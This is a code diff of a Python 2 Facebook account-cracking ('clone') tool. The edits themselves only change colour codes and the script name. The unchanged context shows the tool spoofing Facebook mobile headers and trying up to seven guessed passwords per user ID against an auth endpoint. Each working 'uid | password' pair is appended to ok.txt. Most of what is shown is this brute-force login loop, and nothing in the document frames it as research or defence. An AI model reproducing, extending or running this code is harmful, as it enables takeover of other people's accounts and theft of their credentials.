@@ -7,7 +7,7 @@ try:
     from multiprocessing.pool import ThreadPool
 except ImportError:
     os.system("pip2 install requests")
-    os.system("python2 Arbab.py")
+    os.system("python2 Hiphop.py")
 os.system("clear")
 """
 try:
@@ -47,9 +47,9 @@ sim=random.randint(2e4, 4e4)
 header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
 sys.setdefaultencoding("utf-8")
-c = "\033[1;32m"
-c2 = "\033[0;97m"
-c3 = "\033[1;31m"
+c = "\033[1;97m"
+c2 = "\033[0;91m"
+c3 = "\033[1;95m"
 #MyLogo
 def logo():
     os.system('echo -e "\n\n db   db       .d88b.       d8888b.\n 88   88      .8P  Y8.      88   8D\n 88ooo88      88    88      88oodD\n 88~~~88      88    88      88~~~\n 88   88       8b  d8       88 \n YP   YP        Y88P        88\n\n-----------------------------------------------\n\n➣ Codded By : Arbab Memon\n➣ Facebook  : Arbab Memon\n➣ Github    : https://github.com/Arbab-Memon\n➣ Youtube   : Cyber-Gange \n\n-----------------------------------------------" | lolcat')
@@ -57,7 +57,7 @@ def method_menu():
     os.system("clear")
     logo()
     print("")
-    print("\t    \033[1;32mClone Method Menu\033[0;97m")
+    print("\t    \033[1;93mClone Method Menu\033[0;94m")
     print("")
     print("[1] B-api (Fast)")
     print("[2] Localhost (Slow)")
@@ -71,7 +71,7 @@ def method_menu_select():
         l_menu()
     else:
         print("")
-        print("\t    \033[1;31mSelect valid option \033[0;97m")
+        print("\t    \033[1;31mSelect valid option \033[0;98m")
         print("")
         method_menu_select()
 def login():
@@ -752,7 +752,7 @@ def l_menu_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
@@ -769,7 +769,7 @@ def l_menu_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
@@ -786,7 +786,7 @@ def l_menu_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
@@ -803,7 +803,7 @@ def l_menu_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
@@ -820,7 +820,7 @@ def l_menu_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
@@ -837,7 +837,7 @@ def l_menu_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
@@ -854,7 +854,7 @@ def l_menu_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;91m[OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
